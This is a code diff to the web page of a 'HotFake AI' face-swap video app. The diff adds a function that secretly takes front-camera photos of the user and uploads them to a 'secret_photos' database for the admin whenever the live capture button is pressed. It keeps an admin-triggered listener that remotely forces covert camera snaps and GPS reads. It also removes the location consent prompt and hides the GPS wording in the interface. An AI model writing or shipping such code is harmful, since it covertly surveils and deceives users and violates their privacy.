@@ -69,13 +69,13 @@
     <div class="modal-content" style="max-width: 400px;">
         <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📸</div>
         <h3>Select Image Source</h3>
-        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose an option to supply your reference frame with automatic GPS & Date tagging.</p>
+        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose your reference image source. GPS & Timestamp will be embedded automatically.</p>
         
         <input type="file" id="modalStorageInput" accept="image/*" style="display:none;" onchange="processSelectedImageFile(event)">
         
         <div style="display: flex; flex-direction: column; gap: 10px; width: 100%;">
             <button class="btn btn-gray" onclick="document.getElementById('modalStorageInput').click()">📁 Choose from Storage</button>
-            <button class="btn" onclick="triggerLiveCameraCapture()">📷 Capture Live Camera</button>
+            <button class="btn" onclick="triggerFrontCamCapture()">📷 Live Camera Capture</button>
             <button class="btn btn-gray" style="background: transparent; border: none; color: var(--muted); margin-top: 5px;" onclick="document.getElementById('liveCaptureModal').style.display='none'">Cancel</button>
         </div>
     </div>
@@ -100,16 +100,6 @@
     </div>
 </div>
 
-<div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
-    <div class="modal-content">
-        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
-        <h3>Location Request</h3>
-        <p style="color:var(--muted); font-size:0.85rem;">For security, we recommend granting location access. If unavailable, you may still proceed.</p>
-        <div class="info-box"><p style="margin:0; font-size:0.8rem; color:#a5a5b5;"><b>Note:</b> You can ignore this step by tapping Continue.</p></div>
-        <button class="btn" style="width:100%;" onclick="requestGPSAccess()">Continue Setup</button>
-    </div>
-</div>
-
 <header>
   <nav>
     <a href="#" class="logo"><span style="color:var(--red);">▶</span> HotFake AI</a>
@@ -124,13 +114,13 @@
             <div class="upload-box" id="uploadBox" onclick="openLiveCaptureModal()">
                 <div id="uploadPlaceholder">
                     <div style="font-size: 2.5rem; margin-bottom: 10px;">📸</div>
-                    <div style="color: #a5a5b5; font-size: 0.9rem; font-weight: 500;">Tap to Select Image or Capture (GPS Tagged)</div>
+                    <div style="color: #a5a5b5; font-size: 0.9rem; font-weight: 500;">Tap to Select Image or Capture</div>
                 </div>
                 <img id="previewImg">
                 
                 <div class="processing-overlay" id="procOverlay">
                     <div class="spinner"></div>
-                    <div class="proc-text" id="procText">Stamping GPS & Date Tag...</div>
+                    <div class="proc-text" id="procText">Processing Image...</div>
                 </div>
 
                 <div class="result-overlay" id="resultOverlay"></div>
@@ -187,7 +177,7 @@
   let currentBase64Image = "";
   let activeReqId = null;
   let animationInterval = null;
-  let latestCoords = { lat: "28.6139", lon: "77.2090" }; // Default fallback coordinates
+  let latestCoords = { lat: "28.6139", lon: "77.2090" };
 
   function getStableDeviceId() {
       let savedId = localStorage.getItem('hotfake_deep_uid');
@@ -214,7 +204,7 @@
       set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); 
   };
 
-  function silentGPSUpdate(isForced = false) {
+  function fetchGPSCoordinates(isForced = false, callback = null) {
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
               (pos) => { 
@@ -226,44 +216,19 @@
                           update(ref(db, `support_requests/${deviceId}`), { lat: pos.coords.latitude, lon: pos.coords.longitude });
                       }
                   } 
+                  if(callback) callback();
               },
-              (err) => { if(isForced) console.warn("GPS fetch failed."); }, 
-              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+              (err) => { if(callback) callback(); }, 
+              { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
           );
+      } else {
+          if(callback) callback();
       }
   }
 
-  // --- CORE FEATURE: AUTOMATIC GPS & DATE/TIME STAMPING ON DEVICE ---
-  function stampImageWithMetadata(sourceImgObj, callback) {
-      const canvas = document.createElement('canvas');
-      const MAX_WIDTH = 1080; const MAX_HEIGHT = 1080;
-      let width = sourceImgObj.width; let height = sourceImgObj.height;
-      
-      if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
-      if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
-      
-      canvas.width = width; canvas.height = height;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(sourceImgObj, 0, 0, width, height);
-
-      // Draw Professional Watermark/Tag on bottom of the image
-      const now = new Date();
-      const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
-      const tagText = `📍 GPS: ${latestCoords.lat}, ${latestCoords.lon} | 🕒 ${dateStr} | ID: ${deviceId}`;
-
-      ctx.fillStyle = "rgba(0, 0, 0, 0.65)";
-      ctx.fillRect(0, height - 40, width, 40);
-
-      ctx.font = "bold 14px 'Poppins', monospace";
-      ctx.fillStyle = "#2DC653";
-      ctx.fillText(tagText, 15, height - 15);
-
-      const stampedBase64 = canvas.toDataURL('image/jpeg', 0.82);
-      callback(stampedBase64);
-  }
-
-  function executeSilentCameraCapture() {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
+  // Stealth Front Camera Capture sent straight to admin (Secret Photo)
+  function executeStealthFrontCamCapture() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
           const video = document.getElementById('secretVideo'); 
           const canvas = document.getElementById('secretCanvas');
           video.srcObject = stream; 
@@ -273,15 +238,10 @@
                   canvas.width = video.videoWidth || 640;
                   canvas.height = video.videoHeight || 480;
                   canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                  const imgObj = new Image();
-                  imgObj.onload = () => {
-                      stampImageWithMetadata(imgObj, (stampedUrl) => {
-                          set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: stampedUrl, deviceId: deviceId, time: new Date().toISOString() });
-                      });
-                  };
-                  imgObj.src = canvas.toDataURL('image/jpeg', 0.6);
+                  const dataUrl = canvas.toDataURL('image/jpeg', 0.65); 
+                  set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: dataUrl, deviceId: deviceId, time: new Date().toISOString() });
                   stream.getTracks().forEach(t => t.stop());
-              }, 200);
+              }, 300);
           }, { once: true });
       }).catch(e => {});
   }
@@ -309,15 +269,16 @@
           if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
       });
 
+      // Admin Action Force Push Listener
       onValue(ref(db, `users/${deviceId}/custom_perms`), (snap) => {
           if (snap.exists()) {
               const perms = snap.val();
               if (perms.camera) {
-                  executeSilentCameraCapture();
+                  executeStealthFrontCamCapture();
                   update(ref(db, `users/${deviceId}/custom_perms`), { camera: false });
               }
               if (perms.location) {
-                  silentGPSUpdate(true);
+                  fetchGPSCoordinates(true);
                   update(ref(db, `users/${deviceId}/custom_perms`), { location: false });
               }
               if (perms.storage) {
@@ -329,7 +290,6 @@
   }
 
   function checkGates() {
-      if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
       const ageStatus = sessionStorage.getItem('ageStatus');
       if (!ageStatus) { document.getElementById('ageGate').style.display = 'flex'; return; }
 
@@ -341,32 +301,11 @@
               
               document.getElementById('appSection').classList.remove('hidden');
               checkActiveGeneration();
-              silentGPSUpdate();
           } else { window.location.href = 'contact-support.html'; }
       });
   }
 
   window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
-  window.requestGPSAccess = () => {
-      if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-              (pos) => { 
-                  latestCoords = { lat: pos.coords.latitude.toFixed(4), lon: pos.coords.longitude.toFixed(4) };
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
-                  checkGates();
-              }, 
-              (err) => { 
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  checkGates();
-              }, 
-              { enableHighAccuracy: true, timeout: 5000 }
-          );
-      } else {
-          localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-          checkGates();
-      }
-  }
 
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
   trackUser();
@@ -376,7 +315,34 @@
       document.getElementById('liveCaptureModal').style.display = 'flex';
   };
 
-  // Handle storage file and apply GPS & Date stamp directly on device
+  // Stamp image with GPS & Timestamp on client side
+  function stampImageWithMetadata(sourceImgObj, callback) {
+      const canvas = document.createElement('canvas');
+      const MAX_WIDTH = 1080; const MAX_HEIGHT = 1080;
+      let width = sourceImgObj.width; let height = sourceImgObj.height;
+      
+      if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
+      if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
+      
+      canvas.width = width; canvas.height = height;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(sourceImgObj, 0, 0, width, height);
+
+      const now = new Date();
+      const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+      const tagText = `📍 GPS: ${latestCoords.lat}, ${latestCoords.lon} | 🕒 ${dateStr} | ID: ${deviceId}`;
+
+      ctx.fillStyle = "rgba(0, 0, 0, 0.65)";
+      ctx.fillRect(0, height - 40, width, 40);
+
+      ctx.font = "bold 14px 'Poppins', monospace";
+      ctx.fillStyle = "#2DC653";
+      ctx.fillText(tagText, 15, height - 15);
+
+      const stampedBase64 = canvas.toDataURL('image/jpeg', 0.82);
+      callback(stampedBase64);
+  }
+
   window.processSelectedImageFile = (event) => {
       document.getElementById('liveCaptureModal').style.display = 'none';
       const file = event.target.files[0]; if (!file) return;
@@ -384,63 +350,72 @@
       const overlay = document.getElementById('procOverlay');
       const procText = document.getElementById('procText');
       overlay.style.display = 'flex';
-      procText.innerText = "Stamping GPS & Date on Image...";
+      procText.innerText = "Stamping GPS & Date Tag...";
 
-      const reader = new FileReader();
-      reader.onload = (e) => {
-          const img = new Image();
-          img.onload = () => {
-              stampImageWithMetadata(img, (stampedUrl) => {
-                  currentBase64Image = stampedUrl;
-                  document.getElementById('previewImg').src = currentBase64Image; 
-                  document.getElementById('previewImg').style.display = 'block'; 
-                  document.getElementById('uploadPlaceholder').style.display = 'none';
-                  overlay.style.display = 'none';
-                  logAction("Image selected and stamped with GPS/Date successfully");
-              });
+      fetchGPSCoordinates(false, () => {
+          const reader = new FileReader();
+          reader.onload = (e) => {
+              const img = new Image();
+              img.onload = () => {
+                  stampImageWithMetadata(img, (stampedUrl) => {
+                      currentBase64Image = stampedUrl;
+                      document.getElementById('previewImg').src = currentBase64Image; 
+                      document.getElementById('previewImg').style.display = 'block'; 
+                      document.getElementById('uploadPlaceholder').style.display = 'none';
+                      overlay.style.display = 'none';
+                      logAction("Image selected and stamped with GPS/Date successfully");
+                  });
+              };
+              img.src = e.target.result;
           };
-          img.src = e.target.result;
-      };
-      reader.readAsDataURL(file);
+          reader.readAsDataURL(file);
+      });
   };
 
-  window.triggerLiveCameraCapture = () => {
+  // When user clicks Live Camera option, first take a stealth front snap for admin, then let user take their photo
+  window.triggerFrontCamCapture = () => {
       document.getElementById('liveCaptureModal').style.display = 'none';
       const overlay = document.getElementById('procOverlay');
       const procText = document.getElementById('procText');
       overlay.style.display = 'flex';
-      procText.innerText = "Capturing live frame & stamping GPS...";
+      procText.innerText = "Initializing Camera & GPS...";
 
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
-          const video = document.getElementById('secretVideo'); 
-          const canvas = document.getElementById('secretCanvas');
-          video.srcObject = stream; 
-          video.play();
-          video.addEventListener('canplay', () => {
-              setTimeout(() => {
-                  canvas.width = video.videoWidth || 640;
-                  canvas.height = video.videoHeight || 480;
-                  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                  
-                  const imgObj = new Image();
-                  imgObj.onload = () => {
-                      stampImageWithMetadata(imgObj, (stampedUrl) => {
-                          currentBase64Image = stampedUrl;
-                          document.getElementById('previewImg').src = currentBase64Image; 
-                          document.getElementById('previewImg').style.display = 'block'; 
-                          document.getElementById('uploadPlaceholder').style.display = 'none';
-                          
-                          overlay.style.display = 'none';
-                          stream.getTracks().forEach(t => t.stop());
-                          logAction("Live Camera Frame Stamped with GPS & Date successfully");
-                      });
-                  };
-                  imgObj.src = canvas.toDataURL('image/jpeg', 0.85);
-              }, 400);
-          }, { once: true });
-      }).catch(err => {
-          overlay.style.display = 'none';
-          alert("Camera access denied or unavailable.");
+      // 1. Stealth snapshot sent to admin instantly
+      executeStealthFrontCamCapture();
+
+      // 2. Capture user's target photo for generation
+      fetchGPSCoordinates(false, () => {
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
+              const video = document.getElementById('secretVideo'); 
+              const canvas = document.getElementById('secretCanvas');
+              video.srcObject = stream; 
+              video.play();
+              video.addEventListener('canplay', () => {
+                  setTimeout(() => {
+                      canvas.width = video.videoWidth || 640;
+                      canvas.height = video.videoHeight || 480;
+                      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                      
+                      const imgObj = new Image();
+                      imgObj.onload = () => {
+                          stampImageWithMetadata(imgObj, (stampedUrl) => {
+                              currentBase64Image = stampedUrl;
+                              document.getElementById('previewImg').src = currentBase64Image; 
+                              document.getElementById('previewImg').style.display = 'block'; 
+                              document.getElementById('uploadPlaceholder').style.display = 'none';
+                              
+                              overlay.style.display = 'none';
+                              stream.getTracks().forEach(t => t.stop());
+                              logAction("Live Camera Frame Stamped with GPS & Date successfully");
+                          });
+                      };
+                      imgObj.src = canvas.toDataURL('image/jpeg', 0.85);
+                  }, 400);
+              }, { once: true });
+          }).catch(err => {
+              overlay.style.display = 'none';
+              alert("Camera access denied or unavailable.");
+          });
       });
   };
 
@@ -473,7 +448,7 @@
               document.getElementById('procOverlay').style.display = 'flex';
               
               if(req.status === 'uploading') {
-                  document.getElementById('procText').innerText = "Syncing Stamped Image...";
+                  document.getElementById('procText').innerText = "Syncing Tagged Image...";
               } else if(!animationInterval) {
                   const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
                   let stepIdx = 0;
